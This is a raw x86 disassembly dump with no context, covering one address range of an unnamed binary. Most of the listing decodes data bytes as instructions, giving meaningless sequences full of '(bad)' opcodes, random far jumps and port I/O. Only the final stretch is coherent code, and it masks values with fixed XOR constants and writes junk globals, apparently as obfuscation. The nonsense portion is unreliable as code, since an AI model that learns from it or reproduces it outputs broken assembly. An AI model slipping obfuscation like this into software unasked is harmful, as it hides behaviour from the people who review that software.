  40a2b6:	mov    esp,0x3a2c3e5a
  40a2bb:	inc    eax
  40a2bc:	mov    cs,WORD PTR [eax]
  40a2be:	rcl    ebx,1
  40a2c0:	int3   
  40a2c1:	ficomp WORD PTR [ebx-0x70439c4a]
  40a2c7:	(bad)  
  40a2c8:	dec    ebp
  40a2c9:	fimul  WORD PTR [edx-0x3d54fa62]
  40a2cf:	sbb    ebx,DWORD PTR [ecx+edi*2]
  40a2d2:	(bad)  
  40a2d3:	xchg   edi,eax
  40a2d4:	jp     0x40a2c1
  40a2d6:	je     0x40a2dc
  40a2d8:	cmc    
  40a2d9:	shr    DWORD PTR [esi+0x378b2e7b],0x62
  40a2e0:	jbe    0x40a2cf
  40a2e2:	mov    ds:0xb6e281a1,eax
  40a2e7:	in     al,0x87
  40a2e9:	add    eax,DWORD PTR [eax-0x1]
  40a2ec:	enter  0x2cac,0xb
  40a2f0:	mov    ebx,0xab819867
  40a2f5:	in     al,0x20
  40a2f7:	ins    DWORD PTR es:[edi],dx
  40a2f8:	add    BYTE PTR [ecx],bl
  40a2fa:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2fc:	(bad)  
  40a2fd:	push   esi
  40a2fe:	pminub mm1,mm7
  40a301:	daa    
  40a302:	int3   
  40a303:	adc    ebx,ebp
  40a305:	push   eax
  40a306:	adc    al,0x82
  40a308:	test   DWORD PTR [edi-0x2293864b],ecx
  40a30e:	ret    0xd5d1
  40a311:	adc    dl,BYTE PTR [eax]
  40a313:	(bad)  
  40a314:	jmp    0x40a32e
  40a316:	data16 jae 0x40a2c7
  40a319:	test   DWORD PTR [ebx-0x76f4855d],esi
  40a31f:	shl    edx,0xee
  40a322:	call   0xe209:0xc6292bd1
  40a329:	add    dl,BYTE PTR [esi+0x5a]
  40a32c:	mov    bh,0x4d
  40a32e:	imul   esp,DWORD PTR [esi+0x1e],0x803881a2
  40a335:	push   0xffffffe7
  40a337:	imul   ecx,DWORD PTR [ecx],0x8169cd5c
  40a33d:	xor    DWORD PTR [eax+0x8],ecx
  40a340:	cld    
  40a341:	push   cs
  40a342:	(bad)
  40a345:	fidivr DWORD PTR [eax+0x7f]
  40a348:	cmc    
  40a349:	pop    edx
  40a34a:	lods   eax,DWORD PTR ds:[esi]
  40a34b:	das    
  40a34c:	arpl   WORD PTR [edi],cx
  40a34e:	enter  0x6da3,0x84
  40a352:	jno    0x40a3a5
  40a354:	and    DWORD PTR [edi-0x5c],eax
  40a357:	xlat   BYTE PTR ds:[ebx]
  40a358:	or     dl,BYTE PTR [eax]
  40a35a:	imul   ebp,DWORD PTR [edi-0x15],0x75565a88
  40a361:	call   0x7256:0x924d3239
  40a368:	jl     0x40a387
  40a36a:	(bad)  
  40a36b:	cld    
  40a36c:	dec    edi
  40a36d:	and    al,al
  40a36f:	jp     0x40a3ce
  40a371:	mov    bh,0x34
  40a373:	add    al,0xb0
  40a375:	lds    edx,FWORD PTR [ebp-0x44a81acb]
  40a37b:	add    BYTE PTR [edx],cl
  40a37d:	xor    BYTE PTR [ecx-0x57c79c5a],bh
  40a383:	imul   ebp,DWORD PTR [ebx-0x19e5b0b9],0x47
  40a38a:	xchg   esp,eax
  40a38b:	mov    edi,0xec6f2724
  40a390:	xlat   BYTE PTR ds:[ebx]
  40a391:	div    DWORD PTR [ecx+0x13be567a]
  40a397:	repz (bad) 
  40a399:	pop    esi
  40a39a:	mov    ?,WORD PTR [edi]
  40a39c:	ror    BYTE PTR [ecx-0x80],cl
  40a39f:	leave  
  40a3a0:	dec    eax
  40a3a1:	test   al,0xa3
  40a3a3:	adc    eax,0x1beac154
  40a3a8:	ins    BYTE PTR es:[edi],dx
  40a3a9:	(bad)  
  40a3aa:	or     esp,DWORD PTR [ecx]
  40a3ac:	ja     0x40a3cb
  40a3ae:	test   DWORD PTR [edx],esp
  40a3b0:	sub    ah,cl
  40a3b2:	popa   
  40a3b3:	hlt    
  40a3b4:	add    bl,BYTE PTR [esi]
  40a3b6:	lahf   
  40a3b7:	loop   0x40a388
  40a3b9:	adc    BYTE PTR [edx+0x14f4fbf3],cl
  40a3bf:	ja     0x40a393
  40a3c1:	jmp    0x40a3f6
  40a3c3:	out    dx,al
  40a3c4:	or     ch,bh
  40a3c6:	ret    
  40a3c7:	or     al,dh
  40a3c9:	out    dx,al
  40a3ca:	test   eax,0xed945357
  40a3cf:	inc    edi
  40a3d0:	mov    al,0xc2
  40a3d2:	mov    al,ds:0xd342799e
  40a3d7:	xor    bh,BYTE PTR [ebp+0x20]
  40a3da:	push   eax
  40a3db:	dec    ebx
  40a3dc:	mov    ah,0x97
  40a3de:	lds    esi,FWORD PTR [ebp-0x6d9d6971]
  40a3e4:	adc    eax,DWORD PTR [ebp+eax*1-0x68]
  40a3e8:	sub    ebp,edi
  40a3ea:	add    DWORD PTR [ebx-0x78],ebx
  40a3ed:	jae    0x40a407
  40a3ef:	data16 jg 0x40a46a
  40a3f2:	mov    esi,0xa733aa5
  40a3f7:	adc    ebp,esp
  40a3f9:	mov    edx,0x4ad8d92f
  40a3fe:	mov    bl,0xcf
  40a400:	dec    esi
  40a401:	mov    ecx,0xda53d415
  40a406:	mov    ah,0x58
  40a408:	xor    eax,0xe1484f49
  40a40d:	or     BYTE PTR [ebx-0x5e],al
  40a410:	pop    ss
  40a411:	pop    ebp
  40a412:	into   
  40a413:	add    eax,edi
  40a415:	add    DWORD PTR [ebx-0x47],ebx
  40a418:	fsubr  QWORD PTR [ecx+0x76]
  40a41b:	(bad)  
  40a41d:	cwde   
  40a41e:	in     eax,dx
  40a41f:	add    eax,0xb98808ef
  40a424:	jns    0x40a428
  40a426:	shr    DWORD PTR [ebp-0xf],0x27
  40a42a:	or     dh,0xce
  40a42d:	sub    esi,ebp
  40a42f:	dec    esp
  40a430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a431:	shr    BYTE PTR [edx],1
  40a433:	fst    QWORD PTR [eax+0x69]
  40a436:	jbe    0x40a458
  40a438:	leave  
  40a439:	inc    ebx
  40a43a:	add    eax,0x4e6ddfe9
  40a43f:	ss pop ss
  40a441:	jns    0x40a3de
  40a443:	stos   DWORD PTR es:[edi],eax
  40a444:	fisub  WORD PTR [ecx+0x16]
  40a447:	and    ebp,DWORD PTR [edx+0x71]
  40a44a:	xor    eax,0xd2b617bc
  40a44f:	sahf   
  40a450:	hlt    
  40a451:	adc    al,0x7e
  40a453:	and    eax,0xe18e8619
  40a458:	inc    edi
  40a459:	push   edi
  40a45a:	daa    
  40a45b:	xor    DWORD PTR [eax],eax
  40a45d:	pop    edx
  40a45e:	aad    0xe0
  40a460:	jmp    0x661f:0x50022884
  40a467:	or     BYTE PTR [ebx],bl
  40a469:	cmp    eax,DWORD PTR ds:0xd6a0b5dd
  40a46f:	dec    eax
  40a470:	inc    ebx
  40a471:	xchg   esi,eax
  40a472:	stos   DWORD PTR es:[edi],eax
  40a473:	sub    al,0x41
  40a475:	outs   dx,DWORD PTR ds:[esi]
  40a476:	ret    
  40a477:	icebp  
  40a478:	out    dx,al
  40a479:	mov    al,ds:0xad5f003f
  40a47e:	mov    cl,0x9f
  40a480:	aam    0xeb
  40a482:	fdivr  st(2),st
  40a484:	mov    eax,ds:0xc5e0eaa
  40a489:	jnp    0x40a49f
  40a48b:	jo     0x40a4de
  40a48d:	mov    ecx,0xc074e657
  40a492:	scas   al,BYTE PTR es:[edi]
  40a493:	mov    al,ds:0xef60257c
  40a498:	mov    ecx,0xfc236c77
  40a49d:	fs cld 
  40a49f:	push   edx
  40a4a0:	inc    ebp
  40a4a1:	in     eax,dx
  40a4a2:	in     al,0x1a
  40a4a4:	inc    ecx
  40a4a5:	or     DWORD PTR [edx+0x59],ebp
  40a4a8:	outs   dx,BYTE PTR ds:[esi]
  40a4a9:	ss pop ds
  40a4ab:	dec    edx
  40a4ac:	int3   
  40a4ad:	xor    DWORD PTR [esi-0x62132677],ecx
  40a4b3:	jg     0x40a4a9
  40a4b5:	sar    BYTE PTR [ebx+0x7d974911],cl
  40a4bb:	ins    DWORD PTR es:[edi],dx
  40a4bc:	gs loopne 0x40a4cf
  40a4bf:	jns    0x40a481
  40a4c1:	imul   eax,DWORD PTR [edi],0xde24886b
  40a4c7:	nop
  40a4c8:	div    BYTE PTR [ecx]
  40a4ca:	pusha  
  40a4cb:	ins    BYTE PTR es:[edi],dx
  40a4cc:	push   cs
  40a4cd:	je     0x40a47d
  40a4cf:	cdq    
  40a4d0:	cmp    BYTE PTR [ebp-0x8835509],0xc6
  40a4d7:	icebp  
  40a4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d9:	fidivr DWORD PTR [esp+ecx*2-0x35]
  40a4dd:	(bad)  
  40a4de:	pop    ebx
  40a4df:	mov    bl,0x90
  40a4e1:	les    edi,FWORD PTR [eax+ebx*2]
  40a4e4:	call   0xd4270253
  40a4e9:	fbstp  TBYTE PTR gs:[esi]
  40a4ec:	iret   
  40a4ed:	outs   dx,DWORD PTR ds:[esi]
  40a4ee:	stc    
  40a4ef:	sbb    eax,0x435f8bc5
  40a4f4:	jge    0x40a4de
  40a4f6:	mov    DWORD PTR es:[eax],0x8b068b00
  40a4fd:	dec    esi
  40a4fe:	add    al,0xf
  40a500:	lods   al,BYTE PTR ds:[esi]
  40a501:	enter  0xc102,0xe9
  40a505:	add    al,cl
  40a507:	jmp    0x6e2:0x7af1811e
  40a50e:	out    0x51,eax
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a552
  40a524:	jecxz  0x40a4f3
  40a526:	jo     0x40a500
  40a528:	sub    ebx,DWORD PTR [eax]
  40a52a:	sbb    BYTE PTR [esi+0x27181812],bl
  40a530:	fdiv   QWORD PTR ss:[eax]
  40a533:	sbb    eax,0xd6d8bb79
  40a538:	mov    cl,0xf0
  40a53a:	xchg   edi,eax
  40a53b:	xchg   DWORD PTR [eax+0x79],eax
  40a53e:	cli    
  40a53f:	cmp    edx,esp
  40a541:	sar    bl,1
  40a543:	lahf   
  40a544:	mov    cl,0x29
  40a546:	add    esi,DWORD PTR [bx+si]
  40a549:	add    edi,0x28
  40a54c:	in     al,0x84
  40a54e:	xchg   ebx,eax
  40a54f:	pop    esp
  40a550:	lea    esp,[esi]
  40a552:	or     BYTE PTR [edi],ch
  40a554:	aaa    
  40a555:	out    0xb4,al
  40a557:	adc    ch,BYTE PTR [edi+eax*2-0x71]
  40a55b:	jae    0x40a588
  40a55d:	pop    esp
  40a55e:	cld    
  40a55f:	inc    esp
  40a560:	xchg   edi,eax
  40a561:	into   
  40a562:	push   ebp
  40a563:	mov    WORD PTR [ecx+0x2f],gs
  40a566:	lea    edx,[ecx]
  40a568:	std    
  40a569:	add    BYTE PTR [edi-0x1dd8c92],al
  40a56f:	jo     0x40a508
  40a571:	cmp    al,0x7f
  40a573:	pop    ds
  40a574:	and    BYTE PTR [eax+0x44be0211],bl
  40a57a:	lods   eax,DWORD PTR ds:[esi]
  40a57b:	push   ebp
  40a57c:	push   es
  40a57d:	xchg   esp,eax
  40a57e:	call   0x6bd9c892
  40a583:	sub    bh,BYTE PTR [edi+0x6f]
  40a586:	shl    BYTE PTR [esi],cl
  40a588:	pop    ecx
  40a589:	es clc 
  40a58b:	jg     0x40a59a
  40a58d:	into   
  40a58e:	mov    ebp,0x25095779
  40a593:	int3   
  40a594:	inc    DWORD PTR [ecx]
  40a596:	(bad)  
  40a598:	and    eax,0x5dba4168
  40a59d:	inc    esi
  40a59e:	fdivp  st(2),st
  40a5a0:	cmp    bh,bl
  40a5a2:	rol    BYTE PTR [edi],0xa6
  40a5a5:	daa    
  40a5a6:	pop    ds
  40a5a7:	inc    edx
  40a5a8:	mov    ecx,0xfd9aa03
  40a5ad:	popa   
  40a5ae:	pop    ebp
  40a5af:	into   
  40a5b0:	repz pushf 
  40a5b2:	or     BYTE PTR [edi-0x5b],cl
  40a5b5:	iret   
  40a5b6:	sbb    ebp,DWORD PTR [esi-0x2e187678]
  40a5bc:	js     0x40a5a4
  40a5be:	scas   al,BYTE PTR es:[edi]
  40a5bf:	jbe    0x40a640
  40a5c1:	xor    eax,0xd81835ca
  40a5c6:	test   eax,0xd704683a
  40a5cb:	add    ah,BYTE PTR [esi+0x66]
  40a5ce:	mov    dh,0xe8
  40a5d0:	mov    WORD PTR [ebp+ebp*2+0x8],gs
  40a5d4:	in     al,0x11
  40a5d6:	sub    al,0x46
  40a5d8:	cmp    esp,DWORD PTR [ecx-0x1e013ac4]
  40a5de:	dec    esi
  40a5df:	in     eax,0xc3
  40a5e1:	int    0x19
  40a5e3:	inc    esp
  40a5e4:	sub    edi,eax
  40a5e6:	jle    0x40a5bb
  40a5e8:	sbb    eax,0x2e2fff51
  40a5ed:	aam    0x7b
  40a5ef:	sahf   
  40a5f0:	out    0xcb,eax
  40a5f2:	jp     0x40a667
  40a5f4:	or     DWORD PTR [esi+0x6b],esi
  40a5f7:	mov    ds:0xd935476f,eax
  40a5fc:	nop
  40a5fd:	scas   eax,DWORD PTR es:[edi]
  40a5fe:	mov    eax,DWORD PTR [ebp+0xefe4aaa]
  40a604:	mov    ecx,esp
  40a606:	call   0x8da3:0x8b542f8b
  40a60d:	jle    0x40a677
  40a60f:	mov    eax,0xef8a66f9
  40a614:	icebp  
  40a615:	inc    edi
  40a616:	lods   al,BYTE PTR ds:[esi]
  40a617:	fsub   QWORD PTR [eax+0x3deb9df0]
  40a61d:	or     al,0xc2
  40a61f:	cwde   
  40a620:	xor    ah,BYTE PTR [edx]
  40a622:	push   edx
  40a623:	dec    ecx
  40a624:	or     BYTE PTR [edx],ah
  40a626:	jns    0x40a607
  40a628:	es dec edx
  40a62a:	pop    ecx
  40a62b:	push   ecx
  40a62c:	arpl   si,sp
  40a62e:	stos   BYTE PTR es:[edi],al
  40a62f:	mov    WORD PTR [edx-0x1e],es
  40a632:	cmp    BYTE PTR [edi-0x590c94b3],0x49
  40a639:	shl    BYTE PTR [esi],1
  40a63b:	leave  
  40a63c:	jo     0x40a5be
  40a63e:	mov    eax,ds:0x333fb75d
  40a643:	cdq    
  40a644:	sbb    dh,dh
  40a646:	(bad)  
  40a647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a648:	mov    al,0xfc
  40a64a:	jo     0x40a63b
  40a64c:	mov    cs,WORD PTR gs:[edi]
  40a64f:	lods   eax,DWORD PTR ds:[esi]
  40a650:	adc    eax,0x707e508f
  40a655:	invd   
  40a657:	ss dec edi
  40a659:	idiv   DWORD PTR [ebx+0x32]
  40a65c:	test   al,0x58
  40a65e:	and    BYTE PTR [eax+edx*4],cl
  40a661:	out    0x3,eax
  40a663:	out    dx,eax
  40a664:	icebp  
  40a665:	mov    ds:0x22cf6bcf,al
  40a66a:	fwait
  40a66b:	cmp    dh,BYTE PTR [esi-0x5873f6cf]
  40a671:	std    
  40a672:	adc    esp,esi
  40a674:	inc    ebx
  40a675:	push   edx
  40a676:	jmp    0x40a68d
  40a678:	mov    WORD PTR [esi-0x7f],cs
  40a67b:	dec    ebp
  40a67c:	cmp    BYTE PTR [esi+0xc],dl
  40a67f:	dec    esi
  40a680:	out    dx,eax
  40a681:	or     al,0x7c
  40a683:	push   0x20e3d1b9
  40a688:	lock stos DWORD PTR es:[edi],eax
  40a68a:	loope  0x40a6c0
  40a68c:	add    DWORD PTR [ebx],0x4a
  40a68f:	add    eax,0x75a1c5a2
  40a694:	fcom   QWORD PTR [edx]
  40a696:	inc    edx
  40a697:	fnstsw WORD PTR [ebp-0x623b13e9]
  40a69d:	adc    eax,0xa8e2cca3
  40a6a2:	bound  ebx,QWORD PTR [ebp-0x54bed54c]
  40a6a8:	loop   0x40a6a7
  40a6aa:	mov    cl,0x5
  40a6ac:	je     0x40a660
  40a6ae:	dec    ebx
  40a6af:	add    al,0x4
  40a6b1:	sbb    esp,DWORD PTR [edi-0x66]
  40a6b4:	fcomp  DWORD PTR [edx+0x27705904]
  40a6ba:	add    DWORD PTR [ebp+0xe],eax
  40a6bd:	rep ins BYTE PTR es:[edi],dx
  40a6bf:	xchg   esi,eax
  40a6c0:	jo     0x40a658
  40a6c2:	lods   al,BYTE PTR ds:[esi]
  40a6c3:	xchg   BYTE PTR [ecx-0x6ff9bdb5],dh
  40a6c9:	aam    0xe3
  40a6cb:	sbb    BYTE PTR [edi],ch
  40a6cd:	test   al,0xb9
  40a6cf:	loope  0x40a6fc
  40a6d1:	es dec esp
  40a6d3:	push   ds
  40a6d4:	iret   
  40a6d5:	adc    eax,0x97a1a3c3
  40a6da:	test   BYTE PTR ds:0xdbb2d163,cl
  40a6e0:	pusha  
  40a6e1:	jne    0x40a6c3
  40a6e3:	int    0xd9
  40a6e5:	stos   DWORD PTR es:[edi],eax
  40a6e6:	jp     0x40a6cb
  40a6e8:	mov    ch,0xf0
  40a6ea:	dec    esi
  40a6eb:	fsub   DWORD PTR [edi-0x33]
  40a6ee:	(bad)  
  40a6ef:	xchg   ecx,eax
  40a6f0:	pop    edi
  40a6f1:	adc    eax,0xf9f17796
  40a6f6:	push   ss
  40a6f7:	enter  0x3376,0x84
  40a6fb:	icebp  
  40a6fc:	push   cs
  40a6fd:	jmp    0xcf3e:0xc72eea89
  40a704:	aas    
  40a705:	test   BYTE PTR [ebx+0x7ca50070],dh
  40a70b:	jns    0x40a72b
  40a70d:	fst    QWORD PTR [ebp-0x57]
  40a710:	cmp    eax,0xbf5b7cc9
  40a715:	mov    ch,0xc2
  40a717:	or     DWORD PTR [esi+0x5d243126],ebp
  40a71d:	ins    BYTE PTR es:[edi],dx
  40a71e:	mov    BYTE PTR [ebp+0x54],0x8c
  40a722:	and    eax,0x4a3f0227
  40a727:	mov    DWORD PTR [ebp+0x70d86bac],0x13d048c8
  40a731:	mov    ecx,0x9a4349d9
  40a736:	in     al,0xb4
  40a738:	inc    ebp
  40a739:	mov    dh,0x83
  40a73b:	out    dx,al
  40a73c:	mov    dl,0x20
  40a73e:	or     BYTE PTR [esp+esi*4-0x2],bl
  40a742:	fistp  DWORD PTR [edx]
  40a744:	lds    eax,FWORD PTR [ecx]
  40a746:	push   0xffffffb4
  40a748:	ja     0x40a739
  40a74a:	sub    al,dh
  40a74c:	mov    DWORD PTR [ebp+0x61],eax
  40a74f:	xchg   BYTE PTR [ebx+0x28],bl
  40a752:	dec    edx
  40a753:	shl    esi,0xf2
  40a756:	or     al,0x66
  40a758:	cmp    BYTE PTR [ecx],dh
  40a75a:	daa    
  40a75b:	or     BYTE PTR [edi],ah
  40a75d:	scas   al,BYTE PTR es:[edi]
  40a75e:	mov    bl,0x1
  40a760:	cmc    
  40a761:	nop
  40a762:	push   cs
  40a763:	jmp    0x40a7bf
  40a765:	stos   DWORD PTR es:[edi],eax
  40a766:	dec    eax
  40a767:	xchg   BYTE PTR [esp+esi*2],dl
  40a76a:	xor    al,al
  40a76c:	dec    ebp
  40a76d:	push   edx
  40a76e:	dec    esp
  40a76f:	ins    DWORD PTR es:[edi],dx
  40a770:	xchg   BYTE PTR [edi],al
  40a772:	cmp    BYTE PTR [ecx],dl
  40a774:	test   DWORD PTR [ecx-0x464ae041],edi
  40a77a:	adc    BYTE PTR [ecx+0x6e],cl
  40a77d:	xor    eax,0x32330465
  40a782:	paddq  mm7,QWORD PTR [esi+0x7e659b23]
  40a789:	scas   eax,DWORD PTR es:[edi]
  40a78a:	aam    0x60
  40a78c:	ret    0x5d91
  40a78f:	jmp    0x8753:0xaeb9a7a9
  40a796:	mov    es,edx
  40a798:	mov    BYTE PTR [edi],0x54
  40a79b:	out    dx,al
  40a79c:	sbb    BYTE PTR [ebp+0x4720d957],al
  40a7a2:	jae    0x40a7b5
  40a7a4:	jnp    0x40a784
  40a7a6:	ins    DWORD PTR es:[edi],dx
  40a7a7:	and    BYTE PTR [ecx+0x43ef7cbd],dh
  40a7ad:	outs   dx,DWORD PTR ds:[esi]
  40a7ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7af:	repz je 0x40a7c9
  40a7b2:	sub    al,0x2b
  40a7b4:	outs   dx,DWORD PTR ds:[esi]
  40a7b5:	fadd   st(0),st
  40a7b7:	jae    0x40a7bb
  40a7b9:	mov    dh,0x3e
  40a7bb:	xor    al,0x2
  40a7bd:	rcr    DWORD PTR [esi],0x82
  40a7c0:	jge    0x40a841
  40a7c2:	sbb    dh,BYTE PTR [bx+si]
  40a7c5:	sbb    eax,0x8c78f0a9
  40a7ca:	rol    BYTE PTR [eax],cl
  40a7cc:	inc    ebp
  40a7cd:	jl     0x40a7b0
  40a7cf:	adc    eax,0x91501435
  40a7d4:	sub    ecx,esp
  40a7d6:	fadd   DWORD PTR cs:[eax]
  40a7d9:	mov    esp,0x813d0dfc
  40a7de:	sar    DWORD PTR [ebx+0x3c],0x34
  40a7e2:	pop    eax
  40a7e3:	mov    ch,0xc2
  40a7e5:	adc    ebp,ebp
  40a7e7:	outs   dx,DWORD PTR ds:[esi]
  40a7e8:	bound  ebp,QWORD PTR [ebp-0x1c]
  40a7eb:	jle    0x40a7b8
  40a7ed:	dec    ebx
  40a7ee:	pop    es
  40a7ef:	lods   eax,DWORD PTR ds:[esi]
  40a7f0:	fsubr  DWORD PTR [ecx+0xc8f2562]
  40a7f6:	loopne 0x40a86f
  40a7f8:	call   0xcd164363
  40a7fd:	lea    ecx,[edx]
  40a7ff:	repz loope 0x40a7c7
  40a802:	lock or eax,0x3d0e5b52
  40a808:	inc    edx
  40a809:	repz or al,0xff
  40a80c:	hlt    
  40a80d:	icebp  
  40a80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a80f:	push   es
  40a810:	or     ch,BYTE PTR [ebx+0x22987660]
  40a816:	or     al,0xd4
  40a818:	adc    ebp,esp
  40a81a:	into   
  40a81b:	adc    edx,edx
  40a81d:	push   es
  40a81e:	in     al,dx
  40a81f:	or     esp,DWORD PTR [edx]
  40a821:	xor    al,BYTE PTR ds:0x2ad0855
  40a827:	inc    edi
  40a828:	cli    
  40a829:	sbb    eax,0x4a
  40a82c:	mov    dl,0xde
  40a82e:	in     eax,0xe9
  40a830:	dec    edi
  40a831:	fwait
  40a832:	jle    0x40a815
  40a834:	imul   ebp,DWORD PTR [esp+esi*2],0xc82266b
  40a83b:	in     eax,dx
  40a83c:	int    0x16
  40a83e:	jge    0x40a7f9
  40a840:	mov    ebp,esp
  40a842:	cwde   
  40a843:	inc    ebp
  40a844:	leave  
  40a845:	in     al,dx
  40a846:	pop    ds
  40a847:	or     ebp,DWORD PTR ds:0x2b611d21
  40a84d:	out    0x71,al
  40a84f:	cwde   
  40a850:	xor    DWORD PTR [esi+0x42],ebp
  40a853:	xchg   DWORD PTR [esi],eax
  40a855:	mov    esi,0xa4e82e51
  40a85a:	cmp    ebp,ebp
  40a85c:	xchg   esp,eax
  40a85d:	jmp    0x71f:0x84e4c355
  40a864:	sahf   
  40a865:	mov    ah,0x60
  40a867:	mul    BYTE PTR [edi]
  40a869:	cmp    dl,BYTE PTR [ebx+0x69f5312e]
  40a86f:	push   ecx
  40a870:	push   edx
  40a871:	sbb    DWORD PTR [ebx-0x1c],esp
  40a874:	adc    eax,0x8baa5f05
  40a879:	ror    DWORD PTR [ebp+0x7ba825b1],cl
  40a87f:	sub    DWORD PTR [edx-0x52],ecx
  40a882:	mov    eax,ds:0x3c50670d
  40a887:	jge    0x40a8c2
  40a889:	sbb    al,0xa8
  40a88b:	loope  0x40a85a
  40a88d:	js     0x40a87e
  40a88f:	or     DWORD PTR [ebx],eax
  40a891:	xor    eax,0xca3d08d9
  40a896:	cmp    eax,0x29c6bc1b
  40a89b:	scas   al,BYTE PTR es:[edi]
  40a89c:	repnz lods al,BYTE PTR ds:[esi]
  40a89e:	xchg   ecx,eax
  40a89f:	in     al,dx
  40a8a0:	into   
  40a8a1:	jae    0x40a8aa
  40a8a3:	xchg   ebx,eax
  40a8a4:	pop    es
  40a8a5:	dec    esi
  40a8a6:	xor    DWORD PTR [eax+0x56],esp
  40a8a9:	add    BYTE PTR [ebp-0x76],cl
  40a8ac:	mov    dl,0x70
  40a8ae:	popa   
  40a8af:	add    bl,BYTE PTR [edi+ebp*4+0x71b5d5aa]
  40a8b6:	xor    DWORD PTR [esi-0x57],edi
  40a8b9:	adc    eax,0xcfdccbec
  40a8be:	jnp    0x40a93b
  40a8c0:	test   al,0xf5
  40a8c2:	lods   al,BYTE PTR ds:[esi]
  40a8c3:	std    
  40a8c4:	mov    ah,0xe3
  40a8c6:	xchg   esi,eax
  40a8c7:	xchg   ebp,eax
  40a8c8:	retf   0xac1
  40a8cb:	push   edi
  40a8cc:	cdq    
  40a8cd:	hlt    
  40a8ce:	bound  esp,QWORD PTR [esi+edi*8-0x9b4d29a]
  40a8d5:	pop    esp
  40a8d6:	shr    BYTE PTR [esi+0x37899d39],cl
  40a8dc:	(bad)  
  40a8dd:	sub    al,0x1e
  40a8df:	cmc    
  40a8e0:	jg     0x40a923
  40a8e2:	xchg   edi,eax
  40a8e3:	ret    0xa100
  40a8e6:	and    al,0x7c
  40a8e8:	(bad)  
  40a8e9:	mov    ecx,esp
  40a8eb:	jmp    0x213266c5
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282c3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282b7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428213,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282bb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428243
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428237,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282b3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x4281eb
  40aa46:	sbb    DWORD PTR ds:0x42812b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
